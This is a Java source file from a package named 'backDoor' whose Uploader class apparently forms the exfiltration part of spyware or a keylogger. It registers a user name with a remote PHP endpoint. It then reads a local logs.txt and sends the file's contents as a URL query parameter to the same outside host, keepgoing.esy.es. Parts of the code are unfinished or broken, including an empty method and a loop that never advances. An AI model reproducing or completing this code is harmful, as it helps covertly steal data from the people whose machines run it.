package backDoor;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Uploader 
{   
    Creater c = new Creater();
    String user = c.user;
    String path = c.path; 
    String lastUpdate = null;
    String uploadString ="";
    String newLine = null;
    int lastUpdateLineNumber =0;
    
    
    public void userUpload() throws IOException
    {
      try {
            URL url = new URL("http://keepgoing.esy.es/Confess/users/addUser.php?data="+URLEncoder.encode(user,"UTF-8"));
            URLConnection ucon = url.openConnection();
            ucon.setDoOutput(true);
            ucon.setRequestProperty("Content-Type", "text/plain");
          //  PrintStream ps = new PrintStream(ucon.getOutputStream());
          //  ps.print(user);
            
            BufferedReader in = new BufferedReader(new InputStreamReader(ucon.getInputStream()));
            String line = null;
            while((line = in.readLine()) != null)
                    {
                        System.out.println(line);
                    }
           // ps.close();
            
          } catch (MalformedURLException ex) {
            Logger.getLogger(Uploader.class.getName()).log(Level.SEVERE, null, ex);
             }
       
        
    }
    
    
    public int logUpload() throws IOException
    {   int done =0;
         try 
         { // uploadString = "123455";
            URL url = new URL("http://keepgoing.esy.es/Confess/users/"+user+"/enterLog.php?data="+URLEncoder.encode(uploadString, "UTF-8"));
            URLConnection ucon = url.openConnection();
            ucon.setDoOutput(true);
            ucon.setRequestProperty("Content-Type", "text/plain");
            
            BufferedReader in = new BufferedReader(new InputStreamReader(ucon.getInputStream()));
            String line = null;
            while((line = in.readLine()) != null)
                    {
                       if(line.equals("Successful_log"))
                     {
                           done =1;
                       }
                    }
        
          } catch (MalformedURLException ex) {
            Logger.getLogger(Uploader.class.getName()).log(Level.SEVERE, null, ex);
             }
         
         return done;
       
    }
    
    
    public void getLineNumber()
    {
    
        
        
    }
    
    public void localScanner1() throws FileNotFoundException, IOException
    {
        int done=0;
        File f = new File(path+"\\logs.txt");
        Scanner s = new Scanner(f);
        while(s.hasNextLine())
        {
            uploadString += "\n"+newLine;
        }
        done = logUpload();
        if(done == 1)
            System.out.println("done uploading");
    }
    
    public void localScanner() throws IOException
    {
        getLineNumber();
        
        int done=0;
        File f = new File(path+"\\logs.txt");
         
        try {
            
            int i =0;
            Scanner s = new Scanner(f);
            if(lastUpdateLineNumber == 0)
            {
                 while(s.hasNextLine())
                {
                    newLine = s.nextLine();
                    uploadString += "\n"+newLine;
                }
            
            }
            else
            {
                while(i<lastUpdateLineNumber)
                {
                newLine = s.nextLine();
                i += 1;
                }
        //       if(lastUpdate.equals(newLine)){
                while(s.hasNextLine())
                {
                    newLine = s.nextLine();
                    uploadString += "\n"+newLine;
                }
            }
             System.out.println(uploadString);
         
            done =logUpload();
            if(done ==1)
            {
              //  lastUpdate = newLine;
              //  lastUpdateLineNumber +=1;
              //  i +=1;
                System.out.println("Upload Successful");
            }
                   
            
        
            
            
            
            
            } catch (FileNotFoundException ex) {
                Logger.getLogger(Uploader.class.getName()).log(Level.SEVERE, null, ex);
            }
    }
}
